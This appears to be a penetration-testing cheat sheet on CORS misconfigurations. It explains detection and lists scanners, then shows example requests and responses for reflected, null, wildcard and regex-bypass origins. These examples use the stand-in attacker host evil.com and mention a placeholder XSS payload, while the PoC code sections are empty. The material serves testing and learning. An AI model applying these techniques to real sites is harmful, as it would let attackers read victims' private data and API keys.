entries.title: What is a CORS Misconfiguration
entries.body:
CORS (Cross-Origin Resource Sharing) is a mechanism that allows the browser to read responses of cross-origin requests. Which origin is allowed to read the response is decided by the server itself via the Access-Control-Allow-Origin (ACAO) header.

The vulnerability arises when the server site-wide trusts the request origin: it does not validate the Origin header and at the same time returns Access-Control-Allow-Credentials: true. Then the attacker's site can send cross-origin requests on the victim's behalf, using their cookies/credentials, and read the response - for example, private data or API keys.

entries.title: Exploitation conditions (what must line up)
entries.body:
The attacker's request (Burp) adds its own Origin:

    Origin: https://evil.com

The victim's response is vulnerable if at the same time:

    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Origin: https://evil.com   ← our Origin reflected
      OR
    Access-Control-Allow-Origin: null               ← null allowed

Key: ACAO reflects an arbitrary/null Origin + ACAC=true. With wildcard `*` the browser does NOT send cookies (see the Wildcard section).

entries.title: How to detect - send an Origin and watch ACAO/ACAC
entries.body:
Algorithm:
1. Find an endpoint that returns sensitive data (most often an API domain).
2. Insert your own header Origin: https://evil.com into the request.
3. Look at the response headers:
   • ACAO repeats your Origin (or = null) → the server does not whitelist the origin.
   • ACAC: true → the response can be read with the victim's credentials.
4. If both line up → confirm the PoC: steal the response via fetch/XHR with withCredentials=true.

Try different Origin values: an arbitrary domain, null, a trusted subdomain/prefix/suffix - whichever one gets reflected.

entries.title: Tools for finding CORS misconfigs
entries.body:
• s0md3v/Corsy - CORS Misconfiguration Scanner.
• chenjj/CORScanner - a fast scanner for CORS configuration vulnerabilities.
• @honoki/PostMessage (tools.honoki.net/postmessage.html) - POC Builder.
• trufflesecurity/of-cors - exploitation of CORS misconfigs in internal networks.
• omranisecurity/CorsOne - fast discovery of CORS Misconfiguration.

entries.title: Vulnerable response - reflection of an arbitrary Origin
entries.body:
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}

entries.title: PoC - stealing the response via XHR (hosted on evil.com)
PoC - HTML page with an Exploit button
entries.body: CORS PoC

entries.title: Vulnerable response - null Origin allowed
entries.body:
Sometimes the server does not reflect the whole Origin, but allows the null origin. In the response it looks like this:

GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}

entries.title: PoC - sandboxed iframe + data: URI (yields Origin null)
XSS on a whitelisted domain → launch a CORS payload
entries.body:
If the application implements a strict whitelist of allowed origins, the payloads above will not work. But if there is an XSS on a trusted (whitelisted) origin, you can inject the CORS exploit there and carry out the attack again - the request will now originate from a trusted Origin:

https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>

entries.title: Wildcard * - no cookies, but readable without authentication
entries.body:
If the server responds with the wildcard origin `*`, the browser NEVER sends cookies. However, if the server does not require authentication, the data is still accessible. This happens on internal servers that are not reachable from the internet: the attacker's site can "pivot" into the internal network and read the server's data without authentication.

Only the wildcard symbol itself is allowed:

    * is the only wildcard origin
    https://*.example.com is not valid

entries.title: Vulnerable response - ACAO: * on an internal API
entries.body:
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}

entries.title: PoC - reading an internal API without credentials
Trusted prefix - any prefix before example.com passes
entries.body:
Sometimes extensions of the original origin are not filtered on the server because of a poorly written regex. In this scenario any prefix before example.com is accepted by the server - that is, an Origin of the form https://evilexample.com is reflected back:

GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}

The PoC is hosted on evilexample.com (the same XHR with withCredentials=true).

entries.title: Unescaped dot in the regex - any letter instead of the dot
entries.body:
The server uses a regex where the dot is not escaped: for example `^api.example.com$` instead of `^api\.example.com$`. Then the dot can be replaced with any letter and you gain access from a third-party domain - the Origin https://apiiexample.com passes the check:

GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}

The PoC is hosted on apiiexample.com (the same XHR with withCredentials=true).
